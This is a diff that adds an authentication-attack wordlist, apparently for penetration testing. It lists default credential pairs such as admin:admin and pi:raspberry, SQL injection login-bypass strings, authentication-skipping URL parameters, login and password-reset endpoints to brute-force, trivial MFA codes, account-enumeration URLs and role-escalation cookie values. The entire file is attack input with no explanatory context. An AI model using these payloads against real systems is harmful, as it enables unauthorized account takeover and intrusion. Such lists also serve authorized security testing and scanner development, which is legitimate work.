@@ -1,0 +1,181 @@
+# ── Default Credentials (username:password) ──
+admin:admin
+admin:password
+admin:123456
+admin:admin123
+admin:password123
+admin:1234
+admin:12345
+admin:123456789
+admin:qwerty
+admin:letmein
+admin:welcome
+admin:monkey
+admin:dragon
+admin:master
+admin:abc123
+admin:pass
+admin:pass123
+admin:root
+admin:toor
+admin:test
+admin:guest
+admin:changeme
+admin:default
+admin:secret
+admin:P@ssw0rd
+admin:Admin@123
+admin:Admin123!
+root:root
+root:toor
+root:password
+root:123456
+root:admin
+root:pass
+root:root123
+test:test
+test:password
+test:123456
+guest:guest
+guest:password
+guest:123456
+user:user
+user:password
+user:123456
+demo:demo
+demo:password
+operator:operator
+manager:manager
+superuser:superuser
+sa:sa
+sa:password
+oracle:oracle
+postgres:postgres
+mysql:mysql
+ftp:ftp
+anonymous:anonymous
+anonymous:
+pi:raspberry
+ubnt:ubnt
+admin:ubnt
+cisco:cisco
+enable:enable
+netscreen:netscreen
+admin:netgear
+admin:1234
+admin:admin1234
+admin:Admin1234
+admin:@dmin
+admin:adm1n
+admin:Adm1n
+admin:P@$$w0rd
+admin:Passw0rd!
+
+# ── Auth Bypass via SQL Injection ──
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR '1'='1'--
+' OR 'x'='x
+') OR ('1'='1
+" OR "1"="1"--
+" OR 1=1--
+admin' OR '1'='1
+admin' OR 1=1--
+1' OR '1'='1
+' OR 1=1#
+' OR 1=1/*
+'OR 1=1--
+'OR'1'='1
+
+# ── Auth Bypass via Parameter Manipulation ──
+?authenticated=true
+?authenticated=1
+?auth=true
+?auth=1
+?logged_in=true
+?logged_in=1
+?is_admin=true
+?is_admin=1
+?bypass=true
+?debug=true
+?test=true
+?skip_auth=true
+?no_auth=true
+
+# ── Password Reset Flaws ──
+/forgot-password
+/reset-password
+/password-reset
+/account/recover
+/account/reset
+/user/reset
+/auth/reset
+/api/reset-password
+/api/forgot-password
+/api/password/reset
+/api/auth/reset
+
+# ── Session Token Patterns (weak) ──
+# Sequential session IDs
+PHPSESSID=1
+PHPSESSID=2
+PHPSESSID=abc123
+JSESSIONID=1
+JSESSIONID=abc123
+session=1
+session=admin
+token=1
+token=admin
+token=test
+
+# ── Brute Force Login Endpoints ──
+/login
+/signin
+/sign-in
+/auth
+/auth/login
+/api/login
+/api/auth
+/api/signin
+/api/v1/login
+/api/v1/auth
+/api/v2/login
+/user/login
+/account/login
+/member/login
+/admin/login
+/wp-login.php
+/wp-admin/
+/administrator/index.php
+/index.php?option=com_users&view=login
+
+# ── MFA / 2FA Bypass ──
+?otp=000000
+?otp=123456
+?otp=111111
+?otp=999999
+?code=000000
+?code=123456
+?mfa_code=000000
+?two_factor_code=000000
+?verify=000000
+?token=000000
+
+# ── Account Enumeration ──
+/api/user/exists?email=admin@admin.com
+/api/user/exists?username=admin
+/api/check-email?email=admin@admin.com
+/api/check-username?username=admin
+/register?username=admin
+/forgot-password?email=admin@admin.com
+
+# ── Cookie / Token Manipulation ──
+role=admin
+role=administrator
+isAdmin=true
+isAdmin=1
+user_type=admin
+access_level=9999
+privilege=superuser
